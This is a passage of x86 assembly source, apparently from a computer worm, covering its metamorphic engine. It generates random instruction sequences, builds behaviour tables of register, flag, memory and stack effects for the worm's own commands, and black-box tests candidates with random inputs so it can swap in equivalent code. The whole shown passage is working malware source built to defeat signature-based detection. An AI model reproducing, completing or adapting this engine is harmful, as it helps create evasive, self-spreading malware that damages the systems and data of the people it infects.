		cc rBCDP,    mov,     ecx, 0x0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDP,      mov,     byte[RandomCode+ebp+1], dl

		cc rDP,      mov,     dh, dl

		cc rDP,      and,     dh, 111000b
		cc rDPF,     cmp,     dh, 100000b
		cc rNoEmul,  je,      EndCRCCycle		     ; OP esp, ... but source and destination reversed
		cc rNoEmul,  jmp,     OPMem32Reg32ESPCheckOK

	     OPMem32Reg32Cont:
		cc rBDP,     mov,     ebx, 0xBF
		cc rBCDP,    mov,     ecx, 0x0
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDP,      mov,     byte[RandomCode+ebp+1], dl

		OPMem32Reg32ESPCheckOK:
		cc rNoEmul,  call,    GetRandomNumber

		cc rDP,      and,     dl, 11000111b
		cc rDPF,     cmp,     dl, 00000100b
		cc rNoEmul,  je,      OPMem32Reg32_3byte
		cc rDPF,     cmp,     dl, 00000101b
		cc rNoEmul,  je,      OPMem32Reg32_6byte
		cc rDPF,     cmp,     dl, 0x40
		cc rNoEmul,  jb,      OPMem32Reg32_2byte
		cc rDPF,     cmp,     dl, 01000100b
		cc rNoEmul,  je,      OPMem32Reg32_4byte
		cc rDPF,     cmp,     dl, 0x80
		cc rNoEmul,  jb,      OPMem32Reg32_3byte
		cc rDPF,     cmp,     dl, 10000100b
		cc rNoEmul,  je,      OPMem32Reg32_7byte
		cc rNoEmul,  jmp,     OPMem32Reg32_6byte

	     OPMem32Reg32_3byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-3)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+2], dl
		cc rP,	     add,     ebp, 0x1
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_4byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-4)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     word[RandomCode+ebp+2], dx
		cc rP,	     add,     ebp, 0x2
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_6byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-6)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rP,	     add,     ebp, 0x4
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_7byte:
		cc rDPF,     cmp,     ebp, (RandomCodeBufferSize-7)
		cc rNoEmul,  jg,      EndCRCCycle
		cc rDP,      mov,     edx, dword[RandomNumber]
		cc rP,	     mov,     dword[RandomCode+ebp+2], edx
		cc rNoEmul,  call,    GetRandomNumber
		cc rDP,      mov,     dl, byte[RandomNumber]
		cc rP,	     mov,     byte[RandomCode+ebp+6], dl
		cc rP,	     add,     ebp, 0x5
		cc rNoEmul,  jmp,     EndOPMem32Reg32

	     OPMem32Reg32_2byte:
	     EndOPMem32Reg32:
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	jmp,  EndCRCCycle
	   OPMem32Reg32End:


	   PushPopReg32:
		cc rAPF,     cmp,     al, 9
		cc rNoEmul,  jne,     PushPopReg32End

		cc rBP,      mov,     ebx, 0x10
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rBDF,     cmp,     dl, 0x0C		      ; 0x5C=pop esp
		cc rNoEmul,  jne,     PushPopReg32FinAdd
		PushPopReg32Xor:
		cc rDP,      xor,     dl, dl		      ; 0x50=push eax
		PushPopReg32FinAdd:
		cc rCDP,     mov,     cl, byte[CGPushPop]

		cc rCDPF,    cmp,     dl, 8
		cc rNoEmul,  jb,      PushPop32GotPush
		cc rCDP,     dec,     cl
		cc rNoEmul,  jmp,     PushPop32GotPopAlreadys
		PushPop32GotPush:
		cc rCDPF,    cmp,     cl, 0
		cc rNoEmul,  js,      PushPop32GotPopAlreadys
		cc rCDP,     inc,     cl
		PushPop32GotPopAlreadys:
		cc rCDP,     mov,      byte[CGPushPop], cl
		cc rDP,      add,     dl, 0x50
		cc rP,	     mov,     byte[RandomCode+ebp], dl
		cc rP,	     add,     ebp, 0x1
	   cc rNoEmul,	jmp,  EndCRCCycle
	   PushPopReg32End:


	   PushImm321:
		cc rAPF,     cmp,     al, 10
		cc rNoEmul,  jne,     PushImm321End
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-5)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rDP,      mov,     dl, 0x68
		cc rP,	     mov,     byte[RandomCode+ebp], dl

		cc rNoEmul,  call,    GetRandomNumber
		cc rP,	     mov,     dword[RandomCode+ebp+1], edx
		cc rP,	     add,     ebp, 0x5
	   cc rNoEmul,	jmp,  EndCRCCycle
	   PushImm321End:

	   PushImm322:
		cc rAPF,     cmp,     al, 11
		cc rNoEmul,  jne,     PushImm322End
		cc rPF,      cmp,     ebp, (RandomCodeBufferSize-2)
		cc rNoEmul,  jg,      EndCRCCycle

		cc rDP,      mov,     dl, 0x6A
		cc rP,	     mov,     byte[RandomCode+ebp], dl

		cc rNoEmul,  call,    GetRandomNumber
		cc rP,	     mov,     byte[RandomCode+ebp+1], dl
		cc rP,	     add,     ebp, 0x2
	   cc rNoEmul,	jmp,  EndCRCCycle
	   PushImm322End:


	   IncDec32:
		cc rAPF,     cmp,     al, 12
		cc rNoEmul,  jne,     IncDec32End

		cc rBP,      mov,     ebx, 0x10
		cc rBCP,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber

		cc rDP,      add,     dl, 0x40
		cc rP,	     mov,     byte[RandomCode+ebp], dl
		cc rP,	     add,     ebp, 0x1
	   cc rNoEmul,	jmp,  EndCRCCycle
	   IncDec32End:


	   EndCRCCycle:

		cc rPF,      cmp,     ebp, RandomCodeBufferSize
    cc rNoEmul,  jb, CreateMoreRandomCode
		cc rA,	     mov,     eax, 0x90909090
		cc rA,	     mov,     dword[RC_Padding], eax
		cc rNoRes,   mov,     dword[RC_Padding+4], eax

cc rNoEmul,  ret


; #####
; #####   Random Code Generator
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   Creator of Behaviour Table of own Code
; #####


CreateRandomRegisters:
	cc rS,	     xor,     esi, esi

	CreateRandomRegistersMore:
		cc rBS,      mov,     ebx, (DataEnd-DataStart)+1
		cc rBCS,     xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rDS,      mov,     dword[rEAX+esi], edx

		cc rS,	    add,     esi, 4
		cc rSF,     cmp,     esi, 7*4
	cc rNoEmul,  jb,      CreateRandomRegistersMore

	cc rB,	     mov,     ebx, 8
	cc rBC,      xor,     ecx, ecx
	cc rNoEmul,  call,    CreateSpecialRndNumber

	cc rA,	    mov,     eax, DataStart
	cc rNoRes,  add,     dword[rEAX+edx*4], eax

		cc rA,	     mov,     eax, dword[rEAX+0x00]
		cc rAB,      mov,     ebx, dword[rEAX+0x04]
		cc rABC,     mov,     ecx, dword[rEAX+0x08]
		cc rABCD,    mov,     edx, dword[rEAX+0x0C]
		cc rABCDP,   mov,     ebp, dword[rEAX+0x10]
		cc rABCDPS,  mov,     esi, dword[rEAX+0x14]
		cc rABCDPSI, mov,     edi, dword[rEAX+0x18]

cc rNoEmul,  ret




PrepareRegistersAndTable:
; In: at dword[tmpAddress]
; Address of BehaviourTable

		cc rA,	     mov,     eax, dword[tmpAddress]

		; initial values are primes between 0x0FFF FFFF - 0xFFFF FFFF
		; except ESP, which is not changed

		cc rAB,      mov,     ebx, dword[rEAX+0x04]
		cc rAB,      mov,     dword[eax+0x04], ebx
		cc rABC,     mov,     ecx, dword[rEAX+0x08]
		cc rABC,     mov,     dword[eax+0x08], ecx
		cc rABCD,    mov,     edx, dword[rEAX+0x0C]
		cc rABCD,    mov,     dword[eax+0x0C], edx
		cc rABCDP,   mov,     ebp, dword[rEAX+0x10]
		cc rABCDP,   mov,     dword[eax+0x10], ebp
		cc rABCDPS,  mov,     esi, dword[rEAX+0x14]
		cc rABCDPS,  mov,     dword[eax+0x14], esi
		cc rABCDPSI, mov,     edi, dword[rEAX+0x18]
		cc rABCDPSI, mov,     dword[eax+0x18], edi

		cc rABCDPSI, push,    ebx
			cc rNoEmul,  pushfd
			cc rABCDPSI, pop,     ebx
			cc rABCDPSI, and,     bl, 10b	      ; FLAGS - all zero except the reserved-1 one
			cc rABCDPSI, push,    ebx
			cc rNoEmul,  popfd		     ; save FLAGS
			cc rABCDPSI, mov,     dword[eax+0x1C], ebx
		cc rABCDPSI, pop,     ebx

		cc rABCDPSI, mov,     dword[eax+0x20], esp

		cc rABCDPSI, push,    ebx
		cc rABCDPSI, mov,     ebx, dword[rEAX+0x00]
		cc rABCDPSI, mov,     dword[eax+0x00], ebx
		cc rABCDPSI, mov,     eax, ebx
		cc rABCDPSI, pop,     ebx

cc rNoEmul,  ret


AnalyseBehaviourOfCode:
; In: at dword[tmpAddress]
; Address of BehaviourTable

	  cc rABCDPSIF, push,  ebx
	  cc rABCDPSIF, mov,   ebx, eax
	  cc rNoEmul,	pushfd

	  cc rABCDPSI,	mov,   eax, dword[hDataMirror]
	  cc rABCDPSIF, cmp,   eax, dword[hDataMirror1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodDataMirror
		cc rAC,     xor,     eax, eax	     ; This value can not be restored, as otherwise the
						     ; behaviour table gets wrong entries. So just make an
						     ; exception and run next random code.
		cc rNoRes,  mov,     byte[eax], cl
	  AnalyseBehaviourOfCodeGoodDataMirror:

	  cc rABCDPSI,	mov,   eax, dword[hTempAlloc1]
	  cc rABCDPSIF, cmp,   eax, dword[hTempAlloc1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodVirtualAlloc
		cc rAC,     xor,     eax, eax			 ; This value can not be restored, too
		cc rNoRes,  mov,     byte[eax], cl
	  AnalyseBehaviourOfCodeGoodVirtualAlloc:

	  cc rABCDPSI,	mov,   eax, dword[hRandomizedData]
	  cc rABCDPSIF, cmp,   eax, dword[hRandomizedData1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodRandomizedData
		cc rAC,     xor,     eax, eax			 ; This value can not be restored, too
		cc rNoRes,  mov,     byte[eax], cl
	  AnalyseBehaviourOfCodeGoodRandomizedData:

	  cc rABCDPSI, mov,   eax, dword[tmpAddress] ; The random code could have changed
						     ; the dword[tmpAddress], so to make sure
						     ; that the address is right, we can compare
						     ; with two other places where the same value
						     ; should be. Noisy channel + self-repair :)
	  cc rABCDPSIF, cmp,   eax, dword[tmpAddress1]
	  cc rNoEmul,	je,    AnalyseBehaviourOfCodeGoodAddress
		cc rABCDPSI, mov,     eax, dword[tmpAddress2]
	  AnalyseBehaviourOfCodeGoodAddress:

		cc rNoEmul,  pushad
						; Temporary Alloced Memory, because it can't be written
						; To .data or hDataMirror as they must stay unchanged for comparing

			cc rAP,      mov,     ebp, dword[hTempAlloc1]	     ; ebp=Temp.VirtualAlloc
			cc rAP,      push,    ebp	      ; Save Temp.VirtualAlloc

			cc rACP,    xor,     ecx, ecx
			Zer0TheTempMemory:
				cc rACP,    mov,     dword[ebp+ecx], 0x0
				cc rACP,    add,     ecx, 0x4
				cc rACPF,   cmp,     ecx, 2*4*4
			cc rNoEmul,  jb,      Zer0TheTempMemory

			cc rACP,     xor,     ecx, ecx	      ; Counter
			cc rACPS,    mov,     esi, dword[hRandomizedData]
			cc rACPSI,   mov,     edi, DataStart


		  CompareMirrorMemAgain:
			cc rACDPSI,  mov,     edx, dword[edi+ecx]
			cc rABCDPSI, mov,     ebx, dword[esi+ecx]

			cc rABCDPSIF,cmp,     edx, ebx
			cc rNoEmul,  je,      CompareMirrorMemNoDifference

			; Found difference!
			; Write it to qword[ebp]
			cc rACDPSI,  mov,     dword[ebp], ecx		; Relative offset of difference
			cc rACPSI,   mov,     dword[ebp+4], edx 	; different dword

			cc rACPSI,   add,     ebp, 8			; Point to next entry

		      CompareMirrorMemNoDifference:
			cc rACPSI,   add,     ecx, 0x4
			cc rACPSIF,  cmp,     ecx, (DataEnd-DataStart)
		  cc rNoEmul,  jb,  CompareMirrorMemAgain

			cc rACPSI,   pop,     esi	 ; temp.VirtualAlloc

			cc rNoEmul,  pushad
			cc rNoEmul,  call,    RestoreTheMemory
			cc rNoEmul,  popad

						; eax=dword[tmpAddress]
			cc rAS,    add,     eax, 9*4	    ; eax ... pointer to MemoryPart of Behaviour Table
			cc rSI,    mov,     edi, eax	    ; Pointer to BehaviourTable
			cc rCSI,   xor,     ecx, ecx
		     AnalyseBehaviourOfCodeWriteMore:
			cc rACSI,  mov,     eax, dword[esi]
			cc rCSI,   mov,     dword[edi], eax
			cc rCSI,   add,     esi, 0x4
			cc rCSI,   add,     edi, 0x4
			cc rCSI,   add,     ecx, 0x4

			cc rCSIF,  cmp,     ecx, 2*4*4
		     cc rNoEmul,  jb, AnalyseBehaviourOfCodeWriteMore	 ; Temp-Memory to BehaviourTable

		cc rNoEmul,  popad
	  cc rNoEmul,  popfd

	  cc rABCDPSIF, push,  ecx    ; temp. save
		cc rNoEmul, pushfd
		cc rABCDPSI, pop, ecx	  ; ECX=Flags
		cc rABCDPSI, sub,   dword[eax+0x1C], ecx    ; save FLAGS-difference
	  cc rABCDPSI, pop,   ecx			     ; restore original ecx

	  cc rABCDPSI, sub,   dword[eax+0x00], ebx    ; EAX (saved as EBX temporarily)
	  cc rABCDPSI, pop,   ebx		      ; restore original ebx

	  cc rACDPSI, sub,   dword[eax+0x04], ebx
	  cc rADPSI,  sub,   dword[eax+0x08], ecx
	  cc rABSI,   sub,   dword[eax+0x0C], edx
	  cc rASI,    sub,   dword[eax+0x10], ebp
	  cc rAI,     sub,   dword[eax+0x14], esi
	  cc rA,      sub,   dword[eax+0x18], edi

	  cc rAB,     mov,   ebx, dword[eax+0x20]    ; ebx=old ESP
	  cc rAB,     sub,   dword[eax+0x20], esp

	  cc rABC,    pop,   ecx		     ; ecx=current return-address
	  cc rABCD,   xor,   edx, edx
	  cc rABC,    mov,   dword[eax+0x44], edx

	  cc rABCF,    cmp,  dword[eax+0x20], +4	     ; has there been a PUSH?
	  cc rNoEmul,  jne,  AnalyseBehaviourOfCodeRestoreESP
	  cc rBC,      pop,  dword[eax+0x44]			 ; Save the offset at the stack

	  AnalyseBehaviourOfCodeRestoreESP:
	  cc rBC,  add,   ebx, 4      ; because of the ""pop ecx"" above
	  cc rNoEmul, mov,   esp, ebx

	  cc rC,   pop,   ebx ; trash 1
	  cc rC,   pop,   ebx ; trash 2
	  cc rC,   pop,   ebx ; trash 3
	  cc rC,   pop,   ebx ; trash 4
	  cc rC,   pop,   ebx ; trash 5
	  cc rC,   pop,   ebx ; trash 6
	  cc rC,   pop,   ebx ; trash 7
	  cc rC,   pop,   ebx ; trash 8
	  cc rC,   push,  dword[tmpDW8]
	  cc rC,   push,  dword[tmpDW7]
	  cc rC,   push,  dword[tmpDW6]
	  cc rC,   push,  dword[tmpDW5]
	  cc rC,   push,  dword[tmpDW4]
	  cc rC,   push,  dword[tmpDW3]
	  cc rC,   push,  dword[tmpDW2]
	  cc rC,   push,  dword[tmpDW1]

	  cc rNoRes, push,  ecx
cc rNoEmul,  ret



MakeBehaviourTableOfOwnCode:
       cc rNoRes,  push,    PAGE_READWRITE
       cc rNoRes,  push,    MEM_COMMIT
       cc rNoRes,  push,    CommandNumber*BehaviourTableSize
       cc rNoRes,  push,    0x0
       cc rNoEmul, stdcall, dword[_VirtualAlloc]     ; For the LocalBehaviourTable of all file's commands
       cc rNoRes,  mov,     dword[hLBTFileCode], eax

       cc rC,	   xor,     ecx, ecx	    ; Counter

     AnalyseNextCommand:
	cc rAC,      mov,     eax, GlobalBehaviourTable
	cc rAC,      add,     eax, ecx
	cc rAC,      mov,     al, byte[eax]
	cc rCF,      cmp,     al, rNoEmul
	cc rNoEmul,  je,      MakeBTNoEmul

	cc rAC,      mov,     eax, dword[WormCodeStart]
	cc rAC,      push,    dword[ecx*8+eax+0x00]
	cc rAC,      pop,     dword[BufferForCode+0x00]

	cc rAC,      push,    dword[ecx*8+eax+0x04]
	cc rAC,      pop,     dword[BufferForCode+0x04]

	cc rAC,      mov,     eax, dword[BufferForCode+0x00]
	cc rABC,     mov,     ebx, dword[BufferForCode+0x04]


	cc rNoEmul,  pushad
		cc rABCD,    xor,     edx, edx
		cc rABD,     mov,     eax, ecx
		cc rABD,     mov,     ebx, BehaviourTableSize
		cc rABD,     mul,     ebx
		cc rABD,     add,     eax, dword[hLBTFileCode]
		cc rAB,      mov,     dword[tmpAddress], eax
		cc rAB,      mov,     dword[tmpAddress1], eax
		cc rAB,      mov,     dword[tmpAddress2], eax

		VEH_TRY FC1

		cc rA,	     xor,     eax, eax
		cc rAB,      mov,     ebx, FileCodeExection
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory
		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION FC1

		VEH_END FC1
	cc rNoEmul,  popad

	MakeBTNoEmul:
	cc rABC,     inc,     ecx
	cc rABCF,    cmp,     ecx, CommandNumber
	cc rNoEmul,  jb,      AnalyseNextCommand

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READONLY
	cc rNoRes,  push,    CommandNumber*BehaviourTableSize
	cc rNoRes,  push,    dword[hLBTFileCode]
	cc rNoEmul, stdcall, dword[_VirtualProtect]	      ; Read only for LBT from now on...

cc rNoEmul,  ret

; #####
; #####   Creator of Behaviour Table of own Code
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   Compare the Behaviour Tables of the file code
; #####   with the random code
; #####


CompareCodeBTwithRandomBT:

		cc rNoEmul,  call,    GetGoodRandomNumber     ; its important where the search-procedure starts
		cc rC,	     xor,     ecx, ecx
		cc rBC,      mov,     ebx, CommandNumber-2
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rD,	     mov,     dword[RndNumCycle], edx
		cc rCD,      xor,     ecx, ecx		 ; Command Counter
		cc rC,	     add,     ecx, edx

	CompareNextTable:
		cc rAC,      mov,     al, byte[GlobalBehaviourTable+ecx]  ; Get the GlobalBT (1 byte) for
							    ; the current command
		cc rACF,     cmp,     al, rNoEmul
		cc rNoEmul,  je,      NotFoundEqualTables

		cc rCD,      xor,     edx, edx
		cc rACD,     mov,     eax, BehaviourTableSize
		cc rAC,      mul,     ecx	 ; eax=edx:eax * ecx = BehaviourTableSize*ecx
		cc rCS,      mov,     esi, eax
		cc rCS,      add,     esi, dword[hLBTFileCode]


		cc rCDS,     xor,     edx, edx		 ; Byte Counter in Table
	   CompareNextByte:
		    ; esi = BehaviourTable (file code) -> eax
		    ; edi = TempBehaviourTable (random code) -> ebx

		    cc rCDSF,	 cmp,  edx, 8
		cc rNoEmul,	 jge, CompareNoException

		    cc rACDS,	  mov,	   al, byte[GlobalBehaviourTable+ecx]  ; Get the GlobalBT (1 byte) for
								; the current command

		    cc rACDS,	  mov,	   ah, 1	      ; ah = 1
		    cc rACDS,	  xchg,    cl, dl	      ; change
		    cc rACDS,	  shl,	   ah, cl	      ;
		    cc rACDS,	  xchg,    cl, dl	      ; Back
					       ; al = GBT
					       ; ah = 1 shl dl

		    cc rACDSF,	  and,	   al, ah
		cc rNoEmul,	  jz,  NoNeedForComparing

		CompareNoException:
		    cc rACDS,	  mov,	   eax, dword[esi+edx*4]		; esi = BehaviourTable (file code) -> eax
		    cc rABCDS,	  mov,	   ebx, dword[TempBehaviourTable+edx*4] ;     = TempBehaviourTable (random code) -> ebx
		    cc rABCDSF,   cmp,	   eax, ebx
		    cc rNoEmul,   jne,	   NotFoundEqualTables

	     NoNeedForComparing:
		cc rACDS,     inc,     edx
		cc rACDSF,    cmp,     edx, BehaviourTableSize/4

	   cc rNoEmul,	jb,   CompareNextByte

		cc rACDS,      mov,	al, byte[CGPushPop]
		cc rACDSF,     cmp,	al, 0x0
		cc rNoEmul,    jns,	CompareFoundNoPopProblem

		cc rACDS,      mov,	eax, dword[TempBehaviourTable+8*4]  ; ESP
		cc rACDSF,     cmp,	eax, -4
		cc rNoEmul,    jne,	NotFoundEqualTables		    ; ESP!=-4 && POP zuerst -> PROBLEM!!!

		CompareFoundNoPopProblem:

		cc rACDSI,     mov,	edi, BufferForCode
		cc rABCDSI,    mov,	ebx, dword[WormCodeStart]
		cc rABCDSI,    mov,	eax, dword[ecx*8+ebx]
		cc rABCDSI,    mov,	dword[edi], eax
		cc rABCDSI,    mov,	eax, dword[ecx*8+ebx+4]
		cc rACDSI,     mov,	dword[edi+4], eax

		cc rACDS,      mov,	al, byte[GlobalBehaviourTable+ecx]
		cc rACDS,      mov,	byte[tmpGBT], al
		cc rNoEmul,    call,	BlackBoxTesting
		cc rACDSF,     cmp,	eax, 0x0
		cc rNoEmul,    je,	SubstituteCommand
		cc rNoEmul,    jmp,	NotFoundEqualTables


	   NotFoundEqualTables:

		cc rACDS,     inc,     ecx
		cc rACDSF,    cmp,     ecx, CommandNumber
		cc rNoEmul,   jne,     CreateSpecialRndNumberNotZero
		cc rACDS,     xor,     ecx, ecx
		CreateSpecialRndNumberNotZero:

		cc rACDS,     mov,     edx, dword[RndNumCycle]
		cc rACDSF,    cmp,     edx, ecx
	cc rNoEmul,   jne,     CompareNextTable

		SubstituteCommandEnd:
cc rNoEmul, ret

; #####
; #####   Compare the Behaviour Tables of the file code
; #####   with the random code
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   BlackBox Testing
; #####   Send in different parameters and compare output
; #####

;BBFoundEqualCode db ""FOUND EQUAL CODE!"",0x0
;BBNoEqualCode    db ""no success"",0x0

BlackBoxTesting:
		cc rNoEmul,  pushad

		cc rC,	     xor,     ecx, ecx
		cc rC,	     mov,     byte[BBExceptionCount], cl	      ; If problems occure with the random values of
								; Mem8/32 operations, we use the original values of the primary test
		cc rNoRes,   push,    ecx	   ; BB Counter

	PerformeAnotherBlackBoxTest:
		cc rNoEmul,  call,    GetRandomNumber

		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, FileCodeExection
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory

		cc rA,	     mov,     eax, BBTableFileCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rNoRes,   mov,     dword[tmpAddress2], eax

		VEH_TRY FC2

		cc rA,	     mov,     al, byte[tmpGBT]
		cc rF,	     and,     al, 10000000b		   ; FLAGS?
		cc rNoEmul,  jz,      BBTestPrePareNoFlags	   ; If Flags are restricted, use very small numbers sometimes.
		cc rB,	     mov,     ebx, 3
		cc rBC,      xor,     ecx, ecx
		cc rNoEmul,  call,    CreateSpecialRndNumber
		cc rF,	     cmp,     dl, 0
		cc rNoEmul,  je,      BBTestPrePareNoFlags

		cc rNoEmul,  call,    CreateRandomRegisters

		cc rABCDPSI, mov,     dword[BBTableFileCode+0x00], eax
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x00], eax
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x04], ebx
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x04], ebx
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x08], ecx
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x08], ecx
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x0C], edx
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x0C], edx
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x10], ebp
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x10], ebp
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x14], esi
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x14], esi
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x18], edi
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x18], edi
		cc rNoEmul,  jmp,     BBTestOverRandomRegisterCreation
		BBTestPrePareNoFlags:


	   ; Prepare Registers and BehaviourTables
		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rA,	     mov,     eax, dword[RandomNumber]
		cc rA,	     mov,     dword[BBTableFileCode+0x00], eax
		cc rA,	     mov,     dword[BBTableRandomCode+0x00], eax

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rAB,      mov,     ebx, dword[RandomNumber]
		cc rAB,      mov,     dword[BBTableFileCode+0x04], ebx
		cc rAB,      mov,     dword[BBTableRandomCode+0x04], ebx

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABC,     mov,     ecx, dword[RandomNumber]
		cc rABC,     mov,     dword[BBTableFileCode+0x08], ecx
		cc rABC,     mov,     dword[BBTableRandomCode+0x08], ecx

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCD,    mov,     edx, dword[RandomNumber]
		cc rABCD,    mov,     dword[BBTableFileCode+0x0C], edx
		cc rABCD,    mov,     dword[BBTableRandomCode+0x0C], edx

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCDP,   mov,     ebp, dword[RandomNumber]
		cc rABCDP,   mov,     dword[BBTableFileCode+0x10], ebp
		cc rABCDP,   mov,     dword[BBTableRandomCode+0x10], ebp

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCDPS,  mov,     esi, dword[RandomNumber]
		cc rABCDPS,  mov,     dword[BBTableFileCode+0x14], esi
		cc rABCDPS,  mov,     dword[BBTableRandomCode+0x14], esi

		cc rNoEmul,  call,    GetGoodRandomNumber
		cc rABCDPSI, mov,     edi, dword[RandomNumber]
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x18], edi
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x18], edi

		BBTestOverRandomRegisterCreation:
		cc rABCDPSI, mov,     dword[BBTableFileCode+0x20], esp
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x20], esp

		cc rABCDPSI, sub,     dword[BBTableFileCode+0x20], 0x08      ; esp is esp+8 here because of
		cc rABCDPSI, sub,     dword[BBTableRandomCode+0x20], 0x08    ; two less calls. But that makes no difference
									     ; just gives a zero in the LBT if no stack change
									     ; occures, that makes further codes easier

		cc rNoEmul,  pushad		     ; Save all registers
			cc rNoEmul,  pushfd	     ; Push Flag-dword to stack
			cc rA,	     pop,     eax	      ; eax=FLAGS

			cc rNoEmul,  call,    GetGoodRandomNumber      ; new random number in dword[RandomNumber]
			cc rAB,      mov,     ebx, dword[RandomNumber] ; ebx = new random number
			cc rAB,      and,     ebx, 100011000001b       ; Just change CF, ZF, SF, OF
			cc rA,	     xor,     eax, ebx		       ; FLAGS xor (dword[RandomNumber] && 100011000000)

			cc rA,	     push,    eax,
			cc rNoEmul,  popfd

			cc rAF,       mov,     dword[BBTableFileCode+0x1C], eax
			cc rF,	      mov,     dword[BBTableRandomCode+0x1C], eax
		cc rNoEmul,  popad

		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION FC2

		VEH_END FC2

		VEH_TRY RC2

		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, RandomCodeExecution
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory

		cc rA,	     mov,     eax, BBTableRandomCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rNoRes,   mov,     dword[tmpAddress2], eax
	   ; Prepare Registers for RandomCode

		cc rA,	     mov,     eax, dword[BBTableRandomCode+0x00]
		cc rAB,      mov,     ebx, dword[BBTableRandomCode+0x04]
		cc rABC,     mov,     ecx, dword[BBTableRandomCode+0x08]
		cc rABCD,    mov,     edx, dword[BBTableRandomCode+0x0C]
		cc rABCDP,   mov,     ebp, dword[BBTableRandomCode+0x10]
		cc rABCDPS,  mov,     esi, dword[BBTableRandomCode+0x14]
		cc rABCDPSI, mov,     edi, dword[BBTableRandomCode+0x18]
		cc rABCDPSI, push,    dword[BBTableRandomCode+0x1C]   ; Flags
		cc rNoEmul,  popfd				      ; Save flags

		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION RC2

		VEH_END RC2

		cc rA,	     mov,     al, byte[bExceptionFC2]
		cc rAF,      cmp,     al, byte[bExceptionRC2]
		cc rNoEmul,  jne,     BBNotEqual	      ; If just one failed, the codes were not the same

		cc rAF,      cmp,     al, 1
		cc rNoEmul,  jne,     BBBothNoException       ; If non of them fail, continue with the standard procedure

		cc rA,	     mov,     al, byte[BBExceptionCount]   ; Both failed -> increase BBExceptionCount, check if Limit if reached

		cc rA,	     inc,     al
		cc rA,	     mov,     byte[BBExceptionCount], al
		cc rAF,      cmp,     al, 23
		cc rNoEmul,  jne,     BBOnlyExceptionLimitNotReached

		cc rNoEmul,  jmp,     BlackBoxTestingWithSimilarParameters	 ; There have been 23 exception for both commands. So lets use the original
								   ; values from primary test
		BBOnlyExceptionLimitNotReached:
		cc rNoEmul,  jmp,     PerformeAnotherBlackBoxTest

		BBBothNoException:
		cc rD,	     xor,     edx, edx		 ; Byte Counter in Table
		cc rD,	     mov,     byte[BBExceptionCount], dl
	   BBCompareNextByte:
		    ; esi = BehaviourTable (file code) -> eax
		    ; edi = TempBehaviourTable (random code) -> ebx
		    cc rDF,	 cmp,	  edx, 8
		 cc rNoEmul,	 jge,	  BBCompareNoException


		    cc rAD,	 mov,	  al, byte[tmpGBT]   ; Get the GlobalBT (1 byte) for
					       ; the current command

		    cc rAD,	 mov,	  ah, 1 	     ; ah = 1
		    cc rAD,	 xchg,	  cl, dl	     ; change
		    cc rAD,	 shl,	  ah, cl	     ;
